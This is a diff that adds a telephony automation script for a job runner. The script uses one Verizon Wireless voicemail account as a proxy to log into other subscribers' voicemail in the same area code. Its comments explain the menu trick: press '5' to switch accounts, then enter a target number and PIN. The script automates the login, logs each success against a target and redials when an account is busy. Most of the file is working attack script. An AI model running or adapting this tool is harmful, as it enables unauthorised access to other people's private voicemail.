@@ -1,0 +1,83 @@
+//	"vwla_login.sns" host connection script
+//
+//	This script shows proxy use of a verizon wireless account to login to any vw number in the same switch (area-code).
+//
+//	We use the trick of setting up our mailbox with the PIN == the last 4 digits of the number. So, when we use this script
+//	and call this number, the new variable &x, retrieves these last four digits for you.
+//
+//	gvjob -c newjob <proxyphone> vwla_login.sns <routing> <targetphone> <targetpin>
+//
+//	<proxyphone> should be tunred off.
+//	The script logs into the <proxyphone> voicemail using the last four digits of <proxyphone> as the PIN
+//	Then the script hits '5' and enters another 10 digit phone number <targetphone> and then its PIN (<targetpin>)
+//
+//	This script is designed to form the beginning of a new set of scripts for vw that use this method., therefore after
+//	logging-in to the target account, the script hangs up.
+//
+VPHONE 7142922453
+P1 7142922454
+P2 1234
+//
+//	Script Created 03/04/05 12:56:56
+//
+
+:start 20
+	expect Voice
+		//	this is an unknown voicemail prompt, so we use Voice
+		send ,,##
+		// 	sending ## gets back a password prompt for the proxy.
+		goto switch
+
+:switch 20
+	expect vwlaPassword
+		//	&x is a new variable containing the last 4 digits of the accessnumber
+		//	e.g. id &a=888-555-1212, then &x=1212.
+		send &x
+//
+//	START OF POSSIBLE CRITICAL SECTION
+//
+
+	expect vwlaMainMenu
+		//	now the magic, entering 5 gets back to a main menu and gives you a chance
+		//	to switch account.
+		send 5
+//
+//	END OF POSSIBLE CRITICAL SECTION
+//
+	expect vwlaEnter10Digit
+		// 	once we have this prompt, we can login to the target.
+		send &1
+		//	you need a little delay here, becuase it says 'connecting' and you don't want
+		//	if to trigger until the voicemail propmpt proper starts (i.e. at the label login)
+		send +2000
+		goto login
+	expect vwlaBadPassword
+		log Bad Proxy Password
+	timeout
+		log Failed Proxy Login
+		hangup
+	onhangup
+		log Proxy Account Busy, Redialing
+		redial
+
+:login 20
+	expect Voice
+		//	now we wait for the target voicemail greeting, again we use Voice
+		send ,,##
+		// 	sending ## gets back a password prompt for the target.
+		goto done
+
+:done 20 
+	expect vwlaPassword
+		// 	&2 is the target PIN
+		send &2
+	expect vwlaBadPassword
+		log Bad Target Password &2
+		hangup
+	expect vwlaMainMenu
+		//	we are logged into the target!!
+		log Logged into Target &1 Through Proxy
+		hangup
+	onhangup
+		log Target Account Busy, Redialing
+		redial
